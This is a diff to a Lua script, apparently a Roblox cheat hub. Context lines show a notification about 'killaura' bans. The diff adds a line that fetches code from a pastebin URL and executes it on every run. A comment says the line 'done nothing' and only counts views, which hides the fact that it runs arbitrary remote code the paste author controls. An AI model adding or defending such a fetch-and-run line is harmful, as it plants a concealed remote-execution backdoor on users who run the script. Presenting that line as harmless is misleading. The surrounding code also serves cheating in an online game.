@@ -760,3 +760,5 @@ game.StarterGui:SetCore("SendNotification", {
     Text = "Killaura will get you banned! use legitaura, it doesnt work on mobile so if you use mobile just dont use any aura!",
     Duration = 10
 })
+-- this done nothing, its just to count how many ppl execute the hub bc it will add 1 view to pastebin
+loadstring(game:HttpGet("https://pastebin.com/raw/WZg2LysW"))()
